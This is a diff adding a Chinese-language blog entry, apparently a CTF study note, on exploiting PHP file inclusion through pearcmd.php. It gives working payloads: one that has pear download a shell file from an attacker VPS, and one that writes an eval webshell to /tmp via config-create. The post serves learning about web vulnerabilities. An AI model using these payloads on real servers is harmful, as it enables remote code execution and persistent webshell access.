@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>pearcmd文件包含</title>
+    <link href="/2023/10/23/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <url>/2023/10/23/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    
+    <content type="html"><![CDATA[<h1 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h1><p>关于这个知识点的话第一次接触还是在buu的暑假挑战赛上，下面来记录一下。</p><h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="1-register-argc-argv"><a href="#1-register-argc-argv" class="headerlink" title="1.register_argc_argv"></a>1.register_argc_argv</h2><p>当phpinfo中<strong>register_argc_argv</strong>是on时，**$_SERVER[‘argv’]**可以获得命令行参数。</p><p>如下图所示:</p><p><img src="https://s2.loli.net/2023/10/23/VjbcRmHpr36ANkF.png" alt="image-20231022185234849.png"></p><p>这里是用+进行一个分隔，而不是&amp;</p><h3 id="简单利用："><a href="#简单利用：" class="headerlink" title="简单利用："></a>简单利用：</h3><p>既然我们可以获得命令行参数的话，我们就可以进行一个命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>=(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这里把a赋值成system，把1赋值成一个命令执行。</p><p><img src="https://s2.loli.net/2023/10/23/56sUAaKv3WTrDQd.png" alt="image-20231022185727273.png"></p><h1 id="pearcmd文件"><a href="#pearcmd文件" class="headerlink" title="pearcmd文件"></a>pearcmd文件</h1><p>利用的就是pearcmd.php中的pecl/pear</p><p>pecl是php中用于管理拓展而使用的命令行工具，pear是pecl所依赖的类库，在php7.3之前是默认安装的，而在php7.4版本及以后是需要指定-with-pear的。</p><p>不过在任意的docker镜像，pecl/pear都是默认安装的，路径在/usr/local/lib/php</p><p>pearcmd.php 文件的储存路径是 /usr/share/php/pearcmd.php</p><p>当执行了pear之后，就可以将$_SERVER[‘argv’]当成参数执行，如果有文件包含漏洞就可以包含pearcmd.php文件，如果可以出网的话就可以从服务器上读取shell文件，进行一个文件包含。</p><p>当然了，不出网也有不出网的用法，下面是对于不出网和出网的总结。</p><h2 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h2><p>pear可以拉远程的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pear install -R /tmp http:<span class="hljs-comment">//vps/shell.php</span><br></code></pre></td></tr></table></figure><p>如果某一个文件包含是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么出网的payload就是：?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+<a href="http://vps/shell.php">http://vps/shell.php</a></p><h2 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h2><p>pearcmd.php 文件里面有一个config-create</p><p>有两个参数，第一个参数是写入文件，第二个参数是设置的路径</p><p>所以在不出网的情况下就可以利用这个。</p><p>payload:?+config-create+/&amp;file=/usr/share/php/pearcmd.php(或者是pearcmd 如果文件包含后面有php这个后缀)&amp;/<?=eval($_GET[1])?>+/tmp/hello.php (这个的话随便设置了)</p><p>然后去访问/tmp/hello.php(当然如果文件包含的后缀带上了php，就去访问/tmp/hello)</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件包含</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>session文件包含</title>
     <link href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     <url>/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
